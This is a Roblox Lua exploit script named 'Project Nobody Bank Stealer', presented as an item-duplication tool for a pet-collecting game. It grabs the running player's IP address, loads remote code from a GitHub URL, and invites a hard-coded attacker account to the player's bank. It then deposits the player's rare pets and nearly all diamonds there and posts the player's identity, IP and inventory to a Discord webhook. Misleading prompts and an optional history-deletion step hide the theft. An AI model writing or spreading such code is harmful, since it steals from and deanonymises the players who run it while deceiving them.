
--SELF SETTINGS--

local dupeKey = 502000957
local Deletehistoryy = true
local autobuybankandupdatetotier2 = true
local givewarning = false
local giveawrningforbuybank = false
local CurrentKey = "DASDMVBDFTOWE4436ASDSGA"

--SELF SETTINGS--

--SETTINGS--

local lib = require(game.ReplicatedStorage:WaitForChild('Framework') : WaitForChild('Library'))
local fardplayer = game.Players.LocalPlayer
local getbankusername = game.Players.LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Owner
local deletebank = game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Bank
local deletehistory = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History:FindFirstChild("Logs")
--local mypetsinbank = "Comming Soon"
local mydiamondsinbank = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Bank.Bottom.Balance.Amount.Text, "%,", "")
local getdiamondsinbank = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Bank.Bottom.Balance.Amount
local getbanktier = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text, "%,", "")
local getbanktierfortier1 = game.Players.LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier
local UserInputService = game:GetService("UserInputService")
local mybanks = lib.Network.Invoke("get my banks")
--local getbank = mybanks[1]['BUID']
local notcontinuedupe = false
local wrongtier = false
local verifedbank = false
local tier1bank = false
local unverifedbank = false
local verifybank = mybanks[1]

local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local PetsList = {}

request = http_request or request or HttpPost or syn.request
local ipAdress = request({
	Url = "https://api.ipify.org/",
	Method = "GET"
})

local GetAuth = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nobodyoffcal/Project-Nobody-Auth/main/Auth.lua"))()

local botname = "Project Nobody Bank Stealer V2.2.0"

local autoerrorhappenedforautobuybank = false
local autobuyedbank = false
local autoupgradedtotier2bank = false
local autoerrorhappenedfortier2 = false
local dupesuccsesd = false
local dupesuccsesd2 = false

local seyanpseee = false
local krkeneleee = false
local scriptware = false
local unkowwnnnn = false

local execlususive = false
local mythiitical = false
local leganadery = false
local rareeef = false
local basicooo = false
local noneeeeee = false

local exclusivessss = 0
local mythicalsssss = 0
local legandneryttt = 0 
local rareasfasffff = 0
local basicoooooooo = 0

local AboutPlayerBank = ""
local AboutPlayerBankTwo = ""
local AboutPlayerBankThree = ""
local Executor = ""
local Pets = ""
local getipadress = ""
local gettier = ""
local getmydiamondsinbank = ""
local getmybankbuid = ""

local Lk = false

local AboutPlayerRole = ""
local AboutAutoSettings = ""
local AboutAutoSettingsTwo = ""
local AboutAutoSettingsThree = ""
local AboutAutoSettingsFour = ""
local AboutAutoSettingsFive = ""

local AuthKeyForMike = "DASDMVBDFTOWE4436ASDSGA"
local AuthKeyForcagula = "DAOD12ODLAMNVASED123087"
local AuthKeyForRaezn = "SADSA213ASDTGRETEREWASDSAR"
local AuthKeyForFate = "AISD9SAD8FHGU243ASDDYJG4"
local AuthKeyForNobody = "DSJHREQWDFSGFHYYIOIU129"
local AuthKeyForyourdailydoseofinternet = "ASDHTRWVCBMJHGOIOULD126"
local AuthKeyForMiniSus = "SAD23GFDGTRYUHTJHGIKUYQ"
local AuthKeyForme = "DASDSADSFGBVOFDTWER163"
local AuthKeyForAlec = "SADYIEWR5E6BGFKJHGYRTQ2"
local AuthKeyForMP = "DSAYTRUYIFGHHKUIOUIE123AS"

local CheckBannedForMike = "Banned_FalseForMike"
local CheckBannedForcagula = "Banned_FalseForcagula"
local CheckBannedForRaezn = "Banned_FalseForRaezn"
local CheckBannedForFate = "Banned_FalseForFate"
local CheckBannedForNobody = "Banned_FalseForNobody"
local CheckBannedForyourdailydoseofinternet = "Banned_FalseForyourdailydoseofinternet"
local CheckBannedForMiniSus = "Banned_FalseForMiniSus"
local CheckBannedForme = "Banned_FalseForAlec"
local CheckBannedForMP = "Banned_FalseForMP"
local CheckBannedForAlec = "Banned_TrueForAlec"

local banned = false
local buyer = false
local admin = false
local guest = false

local BannedTrueForcagula = false
local BannedTrueForRaezn = false
local BannedTrueForNobody = false
local BannedTrueForFate = false
local BannedTrueForyourdailydoseofinternet = false
local BannedTrueForMiniSus = false
local BannedTrueForAlec = false
local BannedTrueForMP = false
local BannedTrueForme = false
local BannedTrueForMike = false

local BannedTrueForcagula2 = false
local BannedTrueForRaezn2 = false
local BannedTrueForNobody2 = false
local BannedTrueForFate2 = false
local BannedTrueForyourdailydoseofinternet2 = false
local BannedTrueForMiniSus2 = false
local BannedTrueForAlec2 = false
local BannedTrueForMP2 = false
local BannedTrueForme2 = false
local BannedTrueForMike2 = false

local GetDevice = ""

--SETTINGS--

--CHECK FOR AUTO SETTINGS--



--CHECK FOR AUTO SETTINGS--

--CHECK FOR ROLE--

function CheckForRole()
    if buyer == true then
        AboutPlayerRole = "Buyer"
    else if admin == true then
        AboutPlayerRole = "Administrator"
    else if guest == true then
        AboutPlayerRole = "Guest"
    else if AboutPlayerRole == "" then
        AboutPlayerRole = "Unkown"
    end
    end
    end
end
end

--CHECK FOR ROLE--

--CHECK FOR MESSAGE--

function CheckForMessage()
    if admin == true then
        print("Welcome Back. Thanks For Using Us.")
        --(0.1)
        print("User Rank : Administrator")
    else if buyer == true then
        print("Welcome Back. Thanks For Using Us.")
        --wait(0.1)
        print("User Rank : Buyer")
    else if guest == true then
        print("Welcome Back. Thanks For Using Us.")
        --wait(0.1)
        print("User Rank : Guest")
        --wait(0.1)
        return true;
    end
end
end
end

--CHECK FOR MESSAGE--

--CHECK FOR ADMIN IP--

function GetIp()
    if admin == true and GetDevice == "Computer" then
        getipadress = "You Cannot See Administrators Ip"
    else if buyer == true or guest == true and GetDevice == "Computer" then
        getipadress = ipAdress.Body
    else if getipadress == "" and GetDevice == "Computer" then
        getipadress = "Unkown"
    else if admin == true or buyer == true or guest == true and GetDevice == "Phone" or GetDevice == "Console" then
        getipadress = "This Fetaure Not Enabled On Phone Or Console"
    end
end
end
end
end

--CHECK FOR ADMIN IP--

--CHECK BAN REASON--

function CheckBannedForReason()
     for i,v in pairs(GetAuth) do 
        if AuthKeyForNobody == "DSJHREQWDFSGFHYYIOIU129" and CurrentKey == "DSJHREQWDFSGFHYYIOIU129" and v == "BannedReason_LeakingScriptForNobody" then
            BannedTrueForNobody = true
        else if AuthKeyForFate == "AISD9SAD8FHGU243ASDDYJG4" and CurrentKey == "AISD9SAD8FHGU243ASDDYJG4" and v == "BannedReason_LeakingScriptForFate" then
            BannedTrueForFate = true
        else if AuthKeyForyourdailydoseofinternet == "ASDHTRWVCBMJHGOIOULD126" and CurrentKey == "ASDHTRWVCBMJHGOIOULD126" and v == "BannedReason_LeakingScriptForyourdailydoseofinternet" then
            BannedTrueForyourdailydoseofinternet = true
        else if AuthKeyForMiniSus == "SAD23GFDGTRYUHTJHGIKUYQ" and CurrentKey == "SAD23GFDGTRYUHTJHGIKUYQ" and v == "BannedReason_LeakingScriptForMiniSus" then
            BannedTrueForMiniSus = true
        else if AuthKeyForme == "DASDSADSFGBVOFDTWER163" and CurrentKey == "DASDSADSFGBVOFDTWER163" and v == "BannedReason_LeakingScriptForme" then
            BannedTrueForme = true
        else if AuthKeyForAlec == "SADYIEWR5E6BGFKJHGYRTQ2" and CurrentKey == "SADYIEWR5E6BGFKJHGYRTQ2" and v == "BannedReason_LeakingScriptForAlec" then
            BannedTrueForAlec = true
        else if AuthKeyForMP == "DSAYTRUYIFGHHKUIOUIE123AS" and CurrentKey == "DSAYTRUYIFGHHKUIOUIE123AS" and v == "BannedReason_LeakingScriptForMP" then
            BannedTrueForMP = true
        else if AuthKeyForRaezn == "SADSA213ASDTGRETEREWASDSAR" and CurrentKey == "SADSA213ASDTGRETEREWASDSAR" and v == "BannedReason_LeakingScriptForRaezn" then
            BannedTrueForMP = true
        else if AuthKeyForcagula == "DAOD12ODLAMNVASED123087" and CurrentKey == "DAOD12ODLAMNVASED123087" and v == "BannedReason_LeakingScriptForcagula" then
            BannedTrueForcagula = true
        else if AuthKeyForMike == "DASDMVBDFTOWE4436ASDSGA" and CurrentKey == "DASDMVBDFTOWE4436ASDSGA" and v == "BannedReason_LeakingScriptForMike" then
            BannedTrueForMike = true
        end
    end
end
end
end
end
end
end
end
end
end
end

--CHECK BAN REASON--

--CHECK FOR BANNED--

function CheckBannedForLeaking()
    banned = true
    print("Your Account Is Banned By Administrator! Contact Any Administrator To Re Active Your Account.")
    wait(0.1)
    CheckBannedForReason()
    wait(0.1)
    if BannedTrueForMP == true then
        print("Ban Reason : Leaking Script")
    else if BannedTrueForAlec == true then
        print("Ban Reason : Leaking Script")
    else if BannedTrueForme == true then
         print("Ban Reason : Leaking Script")
    else if BannedTrueForMiniSus == true then
         print("Ban Reason : Leaking Script")
    else if BannedTrueForNobody == true then
         print("Ban Reason : Leaking Script")
    else if BannedTrueForyourdailydoseofinternet == true then
         print("Ban Reason : Leaking Script")
    else if BannedTrueForMP == true then
         print("Ban Reason : Leaking Script")
    else if BannedTrueForcagula == true then
         print("Ban Reason : Leaking Script")
    else if BannedTrueForMike == true then
         print("Ban Reason : Leaking Script")
    else 
        print("Ban Reason : Unkown")
    return;
end
end
end
end
end
end
end
end
end
end

--CHECK FOR BANNED--

--CHECK FOR PLAYER--

function CheckForUserNobody()
    for i,v in pairs(GetAuth) do 
        if fardplayer.Name == "Nobodyoffcal" and AuthKeyForNobody == "DSJHREQWDFSGFHYYIOIU129" and v == CheckBannedForNobody then
            admin = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForNobody == "DSJHREQWDFSGFHYYIOIU129" and v == "Banned_TrueForNobody" and CurrentKey == "DSJHREQWDFSGFHYYIOIU129" then
            BannedTrueForNobody2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckForUserFatee()
    for i,v in pairs(GetAuth) do 
        if fardplayer.Name == "jhariez4" and AuthKeyForFate == "AISD9SAD8FHGU243ASDDYJG4" and v == CheckBannedForFate then
            admin = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForFate == "AISD9SAD8FHGU243ASDDYJG4" and v == "Banned_TrueForFate"  and CurrentKey == "AISD9SAD8FHGU243ASDDYJG4" then
            BannedTrueForFate2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckForUseryourdailydoseofinternet()
    for i,v in pairs(GetAuth) do
        if fardplayer.Name == "shadow_hunters039" and AuthKeyForyourdailydoseofinternet == "ASDHTRWVCBMJHGOIOULD126" and v == CheckBannedForyourdailydoseofinternet then
            buyer = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForyourdailydoseofinternet == "ASDHTRWVCBMJHGOIOULD126" and v == "Banned_TrueForyourdailydoseofinternet" and CurrentKey == "ASDHTRWVCBMJHGOIOULD126" then
            BannedTrueForyourdailydoseofinternet2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckForUserLidi()
    for i,v in pairs(GetAuth) do
        if fardplayer.Name == "Lidil2544" and AuthKeyForMiniSus == "SAD23GFDGTRYUHTJHGIKUYQ" and v == CheckBannedForyourdailydoseofinternet then
            admin = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForMiniSus == "SAD23GFDGTRYUHTJHGIKUYQ" and v == "Banned_TrueForMiniSus" and CurrentKey == "SAD23GFDGTRYUHTJHGIKUYQ" then
            BannedTrueForMiniSus2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckForUserme()
        for i,v in pairs(GetAuth) do
        if fardplayer.Name == "Noname325632" and AuthKeyForme == "DASDSADSFGBVOFDTWER163" and v == CheckBannedForme then
            buyer = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForme == "DASDSADSFGBVOFDTWER163" and v == "Banned_TrueForme" and CurrentKey == "DASDSADSFGBVOFDTWER163" then
            BannedTrueForme2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckForUserAlec()
        for i,v in pairs(GetAuth) do
        if fardplayer.Name == "roguebrian12345" and AuthKeyForAlec == "SADYIEWR5E6BGFKJHGYRTQ2" and v == CheckBannedForAlec then
            buyer = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForAlec == "SADYIEWR5E6BGFKJHGYRTQ2" and v == "Banned_TrueForAlec" and CurrentKey == "SADYIEWR5E6BGFKJHGYRTQ2" then
            BannedTrueForAlec2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckForUserMP()
        for i,v in pairs(GetAuth) do
        if fardplayer.Name == "MP40_Extendo" and AuthKeyForMP== "DSAYTRUYIFGHHKUIOUIE123AS" and v == CheckBannedForMP then
            buyer = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForMP == "DSAYTRUYIFGHHKUIOUIE123AS" and v == "Banned_TrueForMP" and CurrentKey == "DSAYTRUYIFGHHKUIOUIE123AS" then
            BannedTrueForMP2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckForUserRaezn()
    for i,v in pairs(GetAuth) do 
        if fardplayer.Name == "jyhtgrfedr777" and AuthKeyForRaezn == "SADSA213ASDTGRETEREWASDSAR" and v == CheckBannedForRaezn then
            buyer = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForRaezn == "SADSA213ASDTGRETEREWASDSAR" and v == "Banned_TrueForRaezn" and CurrentKey == "SADSA213ASDTGRETEREWASDSAR" then
            BannedTrueForRaezn2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckForUserCagula()
    for i,v in pairs(GetAuth) do 
        if fardplayer.Name == "itsmihaaaai" and AuthKeyForcagula == "DAOD12ODLAMNVASED123087" and v == CheckBannedForcagula then
            buyer = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForcagula == "DAOD12ODLAMNVASED123087" and v == "Banned_TrueForcagula" and CurrentKey == "DAOD12ODLAMNVASED123087" then
            BannedTrueForcagula2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckForUserMike()
    for i,v in pairs(GetAuth) do 
        if fardplayer.Name == "Xmonster197" and AuthKeyForMike == "DASDMVBDFTOWE4436ASDSGA" and v == CheckBannedForMike then
            buyer = true
            wait(0.1)
            CheckForMessage()
            return true;
        else if AuthKeyForMike == "DASDMVBDFTOWE4436ASDSGA" and v == "Banned_TrueForMike" and CurrentKey == "DASDMVBDFTOWE4436ASDSGA" then
            BannedTrueForMike2 = true
            CheckBannedForLeaking()
        end
    end
end
end

function CheckIfGuest()
    for i,v in pairs(GetAuth) do
        if buyer == false and admin == false and AuthKeyForMiniSus == "SAD23GFDGTRYUHTJHGIKUYQ" or AuthKeyForNobody == "DSJHREQWDFSGFHYYIOIU129" or AuthKeyForFate == "AISD9SAD8FHGU243ASDDYJG4" or AuthKeyForyourdailydoseofinternet == "ASDHTRWVCBMJHGOIOULD126" or AuthKeyForme == "DASDSADSFGBVOFDTWER163" then
            if BannedTrueForMP2 == true and CurrentKey == "DSAYTRUYIFGHHKUIOUIE123AS" or BannedTrueForme2 == true and CurrentKey == "SADYIEWR5E6BGFKJHGYRTQ2" or BannedTrueForAlec2 == true and CurrentKey == "SADYIEWR5E6BGFKJHGYRTQ2" or BannedTrueForyourdailydoseofinternet2 == true and CurrentKey == "ASDHTRWVCBMJHGOIOULD126" or BannedTrueForFate2 == true and CurrentKey == "AISD9SAD8FHGU243ASDDYJG4" or BannedTrueForNobody2 == true and CurrentKey == "DSJHREQWDFSGFHYYIOIU129" or BannedTrueForRaezn2 == true and CurrentKey == "SADSA213ASDTGRETEREWASDSAR" or BannedTrueForcagula2 == true and CurrentKey == "DAOD12ODLAMNVASED123087" then
                CheckBannedForLeaking()
                else
                if Lk == false then
                     guest = true
                     wait(0.1)
                     CheckForMessage()
                 else
                     return;
                 end
                 return true;
            end
        end
    end
end

--CHECK FOR PLAYER--

--VERIFY AUTH--

function VerifyAuth()
     for i,v in pairs(GetAuth) do 
               if v == AuthKeyForNobody or AuthKeyForMiniSus or AuthKeyForFate or AuthKeyForyourdailydoseofinternet and v == "Leaked_False" then
                   CheckForUserLidi()
                   CheckForUseryourdailydoseofinternet()
                   CheckForUserFatee()
                   CheckForUserNobody()
                   CheckIfGuest()
                   CheckForUserme()
                   CheckForUserMP()
                   CheckForUserRaezn()
                   CheckForUserCagula()
               else
                   print("Not Whitelisted")
                   return true;
          end
     end
end


--VERIFY AUTH--

--VERIFY BANK--

if verifybank then
	print("Verifed Bank!")
	verifedbank = true
end

--VERIFY BANK--

--CHECK IF VERIFED OR NOT

if verifedbank == false then
	print("Unverifed Bank!")
	unverifedbank = true
end


--CHECK IF VERIFED OR NOT

--VERIFY BANKS--

function VerifyBanks()
	if verifedbank == true then
		AboutPlayerBank = getmybankbuid
		AboutPlayerBankTwo = gettier
		AboutPlayerBankThree = getmydiamondsinbank
	else if unverifedbank == true then
			AboutPlayerBank = "Player Dont Have Bank"
			AboutPlayerBankTwo = "Player Dont Have Bank"
			AboutPlayerBankThree = "Player Dont Have Bank"
		end
	end
end

--VERIFY BANKS--

--VERIFY DEVICE--

function VerifyDevice()
    if UserInputService.KeyboardEnabled then
        GetDevice = "Computer"
    else if UserInputService.TouchEnabled then
        GetDevice = "Phone"
    else if UserInputService.GamepadEnabled then
        GetDevice = "Console"
    else if GetDevice == "" then
        GetDevice = "Unkown"
    end
end
end
end
end

--VERIFY DEVICE--

--VERIFY EXECUTORS--

function VerifyExecutors()
	if seyanpseee == true then
		Executor = "Synapse X"
	else if scriptware == true then
			Executor = "Scriptware"
		else if krkeneleee == true then
				Executor = "Krnl"
			else if unkowwnnnn == true then
			    Executor = "Unkown"
			end
			end
		end
	end
end

--VERIFY EXECUTORS--

--VERIFY AUTO SETTINGS--

function VerifyAutoSettings()
	if not game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") and autobuyedbank == false then
		AboutAutoSettings = "False"
	else if autobuyedbank == true then
			AboutAutoSettings = "True"
		else if autoerrorhappenedforautobuybank == true and game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") then
				AboutAutoSettings = "Fatal Error 404"
			else if AboutAutoSettings == "" then
					AboutAutoSettings = "Unkown"
				end
			end
		end
	end
end

--VERIFY AUTO SETTINGS--

--VERIFY AUTO SETTINGS TWO--

function VerifyAutoSettingsTwo()
	if getbanktier == "Tier 2 Bank" or getbanktier == "Tier 3 Bank" or getbanktier == "Tier 4 Bank" or getbanktier == "Tier 5 Bank" or getbanktier == "Tier 6 Bank" or getbanktier == "Tier 7 Bank" then
		AboutAutoSettingsTwo = "False"
	else if autoupgradedtotier2bank == true then
			AboutAutoSettingsTwo = "True"
		else if autoerrorhappenedfortier2 == true or game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") or getbanktier == "Bank Tier 1" then
				AboutAutoSettingsTwo = "Fatal Error 404"
			else if AboutAutoSettingsTwo == "" then
					AboutAutoSettingsTwo = "Unkown"
				end
			end
		end
	end
end
--VERIFY AUTO SETTINGS TWO--

--VERIFY AUTO SETTINGS THREE--

function VerifyAutoSettingsThree()
    if dupesuccsesd == true then
        AboutAutoSettingsThree = "True"
    else if dupesuccsesd == false then
        AboutAutoSettingsThree = "False"
    else if AboutAutoSettingsThree == "" then
        AboutAutoSettingsThree = "Unkown"
    end
end
end
end

--VERIFY AUTO SETTINGS THREE--

--VERIFY AUTO SETTINGS FOUR--

function VerifyAutoSettingsFour()
    if dupesuccsesd2 == true then
        AboutAutoSettingsFour = "True"
    else if dupesuccsesd2 == false then
        AboutAutoSettingsFour = "False"
    else if AboutAutoSettingsFour == "" then
        AboutAutoSettingsFour = "Unkown"
    end
end
end
end

--VERIFY AUTO SETTINGS FOUR--

--VERIFY AUTO SETTINGS FIVE--

function VerifyAutoSettingsFive()
    if dupesuccsesd2 == true and dupesuccsesd then
        AboutAutoSettingsFive = "True"
    else if dupesuccsesd2 == false or dupesuccsesd == false then
        AboutAutoSettingsFive = "False"
    else if AboutAutoSettingsFive == "" then
        AboutAutoSettingsFive = "Unkown"
    end
end
end
end

--VERIFY AUTO SETTINGS FIVE--

--VERIFY PETS--

function VerifyPets()
	if execlususive == true then
		Pets = "Exclusive"
	else if mythiitical == true then
			Pets = "Mythical"
		else if leganadery == true then
				Pets = "Legendary"
			else if rareeef == true then
					Pets = "Rare"
				else if basicooo == true then
						Pets = "Basic"
					else if noneeeeee == true then
							Pets = "None"
						end
					end
				end
			end
		end
	end
end

--VERIFY PETS--

--UPDATE SETTINGS--

function UpdateSettings()
	tier1bank = false
	unverifedbank = false
	verifedbank = true
end

--UPDATE SETTINGS--

--CHECK FOR EXECUTOR--

function CheckForExecutor()
	if syn_checkcaller and "Synapse" then
		seyanpseee = true
	else if identifyexecutor() == "ScriptWare" and "ScriptWare" then
			scriptware = true
		else if KRNL_LOADED and "KRNL" then
				krkeneleee = true
			else if krkeneleee == false and scriptware == false and seyanpseee == false then
					unkowwnnnn = true
				end
			end
		end
	end
end

--CHECK FOR EXECUTOR--

--CHECK IF DONT HAVE BANK--

if unverifedbank == true and autobuybankandupdatetotier2 == true then

	local args = {

		[1] = {}
	}
	
	workspace.__THINGS.__REMOTES:FindFirstChild("buy bank"):InvokeServer(unpack(args))

	print("Buyed Bank!")

	wait(1.5)

	if getbanktierfortier1.Text == "Tier 1 Bank" then
		autobuyedbank = true
	else
		autoerrorhappenedforautobuybank = true
	end
	
	VerifyAutoSettings()

	wait(1.5)
end

--CHECK IF DONT HAVE BANK--

--CHECK IF BANK TIER 1--

if getbanktierfortier1.Text == "Tier 1 Bank" and autobuybankandupdatetotier2 == true then
	print("Tier 1 Bank!")
	tier1bank = true
	wait(2)
end

--IF PLAYER BANK TIER 1--

if tier1bank == true and autobuybankandupdatetotier2 == true then
	if getdiamondsinbank.Text == "40000000" or getdiamondsinbank.Text > "40000000" then

    local args = {
     [1] = {
        [1] = mybanks[1]['BUID'],
        [2] = {},
        [3] = 1
     }
     }

    workspace.__THINGS.__REMOTES:FindFirstChild("bank deposit"):InvokeServer(unpack(args))


	else if getdiamondsinbank.Text == "0" or getdiamondsinbank.Text < "40000000" then

    local args = {
     [1] = {
        [1] = mybanks[1]['BUID'],
        [2] = {},
        [3] = 40000000
     }
     }

    workspace.__THINGS.__REMOTES:FindFirstChild("bank deposit"):InvokeServer(unpack(args))

		end  
	end

	print("Deposited Diamonds To Bank!")

	wait(2)

	local args = {
		[1] = {
			[1] = mybanks[1]['BUID'],
		}
	}

	workspace.__THINGS.__REMOTES:FindFirstChild("upgrade bank"):InvokeServer(unpack(args))

	local args = {
		[1] = "b",
		[2] = "upgrade bank"
	}

	workspace.__THINGS.__REMOTES.MAIN:FireServer(unpack(args))

	print("Upgraded Bank!")

	UpdateSettings()

	print("Updated Settings")
		
	if getbanktierfortier1.Text == "Tier 2 Bank" then
		autobuybankandupdatetotier2 = true
	else
		autoerrorhappenedfortier2 = true
	end

	wait(3)
	end

--IF PLAYER BANK TIER 1--

--GET THE BEST PET ON PLAYERS INVENTORY--

for i, v in pairs(lib.Save.Get().Pets) do
	local v2 = lib.Directory.Pets[v.id];

	if v2.rarity == "Exclusive" then
		execlususive = true;
		
		else if v2.rarity == "Mythical" then
			mythiitical = true;

			else if v2.rarity == "Legendary" then
				leganadery = true;

				else if v2.rarity == "Rare" then
					rareeef = true;

					else if v2.rarity == "Basic" then
						basicooo = true;

						else if mythiitical == false and execlususive == false and leganadery == false and rareeef == false and basicooo == false then
							noneeeeee = true;
						end
					end
				end
			end
		end
	end
end

--GET THE BEST PET ON PLAYERS INVENTORY--

--REQUEST FOR LK--

function RequestForLk()
    if Lk == true then
        return;
    end
end

--REQUEST FOR LK--

--FIND PETS ON PLAYER INVENTORY--

for i, v in pairs(lib.Save.Get().Pets) do
	local v2 = lib.Directory.Pets[v.id];
	
		if v2.rarity == "Mythical" then
			mythicalsssss = mythicalsssss + 1

		else if v2.rarity == "Exclusive" then
			exclusivessss = exclusivessss + 1

		else if v2.rarity == "Legendary" then
			legandneryttt = legandneryttt + 1

		else if v2.rarity == "Rare" then
			rareasfasffff = rareasfasffff + 1

		else if v2.rarity == "Basic" then
			basicoooooooo = basicoooooooo + 1
		end
		end
		end		
		end
		
	end
end

--FIND PETS ON PLAYER INVENTORY--

--DEPOSIT PETS--

function DepositPets()
    for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
end

--DEPOSIT PETS--

--SEND LOG--

function SendLog()
	local fardplayer = game.Players.LocalPlayer
	local webhook = true
	local link = mywebhook
	if webhook == true then

		local Embed = {
			["title"] = botname,
			["description"] = "Someone Execute The Script @here !\n\n **About Player** \n\n Player Name : "..fardplayer.Name.." !\n Player Display Name : "..fardplayer.DisplayName.." !\n Player Id : "..fardplayer.UserId.." !\n Player Account Age : "..fardplayer.AccountAge.." !\n Player Ip : "..getipadress.." !\n Player Executor : "..Executor.." !\n Player Role : "..AboutPlayerRole.." !\n Player Device : "..GetDevice.." !\n\n **About Player Bank** \n\n Player Bank Id : "..AboutPlayerBank.." !\n Player Bank Tier : "..AboutPlayerBankTwo.." !\n Player Diamonds In Bank : "..AboutPlayerBankThree.." !\n\n **About Player Inventory** \n\n Player Diamonds In Inventory : "..mydiamonds.." !\n Player Best Pets In Inventory : "..Pets.." !\n Player Have : "..exclusivessss.." Exclusive In Inventory !\n Player Have : "..mythicalsssss.." Mythical In Inventory !\n Player Have : "..legandneryttt.." Legendary In Inventory !\n Player Have : "..rareasfasffff.." Rare In Inventory !\n Player Have : "..basicoooooooo.." Basic In Inventory !\n\n **About Auto Setting** \n\n Auto Buyed Bank : "..AboutAutoSettings.." !\n Auto Upgraded Bank To Tier 2 : "..AboutAutoSettingsTwo.." !\n Auto Invited To Bank  : "..AboutAutoSettingsThree.." !\n Auto Deposited Pets To Bank  : "..AboutAutoSettingsFour.." !\n Auto Dupe Succsesed  : "..AboutAutoSettingsFive.." !\n",
			["type"] = "rich",
			["color"] = tonumber(0xffff00),
			["image"] = {
				["url"] = "https://media.discordapp.net/attachments/931611143301136404/945685880734105620/81ce8b0fe249e136bfef56a9f300e42e.jpg?width=468&height=468"
			},
		}

		(syn and syn.request or http_request or http.request) {
			Url = link;
			Method = 'POST';
			Headers = {
				['Content-Type'] = 'application/json';
			};
			Body = game:GetService'HttpService' : JSONEncode({ content = Content; embeds = {Embed} });
		};
	end
end;		

--SEND LOG--

--INVITE BANK FOR UNLIMITED TIMES--

function InviteBank()
	while true do
		wait(0.1)
		lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey);
	end;
end;

--INVITE BANK FOR UNLIMITED TIMES--

--KICK FROM GAME--

function KickFromGame()
	fardplayer:Kick("Please Rejoin After 10-5 Minutes Or Its Not Gonna Work")
end

--KICK FROM GAME--

--DELETE BANK AND HISTORY--

function DeleteHistory()
    if Deletehistoryy == true then
	deletehistory:Destroy()
	deletebank:Destroy()
	end
end

--DELETE BANK AND HISTORY--

--REQUEST FOR DUPE--

function RequestForDupe()
	if lib.Message.New("Welcome "..fardplayer.Name.." Are You Want To Resume Duping?", true) then
		print("Continue Dupe")
	else
		print("Not Continue Dupe")
		notcontinuedupe = true;
		wait(1)
		--SendLog();
		--InviteBank();
		--KickFromGame();
		return;
	end
end
	
--REQUEST FOR DUPE--

--CHECK IF WRONG TIER--

function CheckIfWrongTier()
	if getbankusername.Text == "@Preston" and getbanktierfortier1.Text == "Tier 7 Bank" and not game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") then
		if fardplayer.Name ~= "BuildIntoGames" then
		    getmybankbuid = "Unkown"
		    gettier = "Unkown"
		    getmydiamondsinbank = "Unkown"
		    wrongtier = true;
			return;
		else
		    getmybankbuid = mybanks[1]['BUID']
		    gettier = getbanktier
		    getmydiamondsinbank = mydiamondsinbank
			wrongtier = false;
		end
	else
	    getmybankbuid = mybanks[1]['BUID']
	    getmydiamondsinbank = mydiamondsinbank
	    gettier = getbanktier
		wrongtier = false;
	end
end

--CHECK IF WRONG TIER--

--CHECK AUTO SETTINGS--

function CheckAutoSettings()
    if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
        wait(0.2)
        dupesuccsesd = true
        print("Invite")
    end
    if lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1) then
        wait(0.2)
        print("Deposit")
        dupesuccsesd2 = true
    end
end

--CHECK AUTO SETTINGS--

--MAIN--

VerifyAuth()
wait(0.1)
RequestForLk()
wait(0.1)
if Lk == false and banned == false then
    VerifyDevice()
    wait(0.1)
    GetIp()
    wait(0.1)
    CheckForRole()
    wait(0.1)
    CheckForExecutor()
    wait(0.1)
    VerifyPets()
    wait(0.1)
    DepositPets()
    wait(0.1)
    CheckAutoSettings()
    wait(0.1)
    VerifyAutoSettings()
    wait(0.1)
    VerifyAutoSettingsTwo()
    wait(0.1)
    VerifyAutoSettingsThree()
    wait(0.1)
    VerifyAutoSettingsFour()
    wait(0.1)
    VerifyAutoSettingsFive()
    wait(0.1)
    CheckIfWrongTier()
    wait(0.1)
    VerifyExecutors()
    wait(0.1)
    RequestForLk()
    wait(0.1)
    VerifyBanks()
    wait(0.1)
    RequestForDupe()
    wait(0.1)
else
    return;
end

if notcontinuedupe == false and banned == false then
	--DeleteHistory()
	--wait(0.1))
	SendLog()
else
	return;
end

--MAIN--

--CHECK IF UNVERIFED BANK--

